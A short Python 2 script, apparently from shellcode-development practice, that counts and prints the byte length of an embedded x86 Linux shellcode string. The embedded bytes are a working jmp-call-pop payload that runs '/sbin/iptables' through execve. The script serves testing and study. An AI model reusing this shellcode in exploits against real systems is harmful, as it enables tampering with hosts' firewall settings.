#!/usr/bin/python

# Counts the number of bytes in shellcode
shellcode = ("\xeb\x1d\x5b\x31\xc0\x50\x68\xef\xbe\xad\xde\x81\x2c\x24\xc2\x72\xad\xde\x89\xe2\x50\x52\x53\x89\xe1\x29\xd2\xb0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61\x62\x6c\x65\x73")


length = 0
# Count each byte in bytearray and increment length.  Too easy!
for byte in bytearray(shellcode):
	#print index(byte)
	length += 1

print "Payload length = " + str(length)
print " "

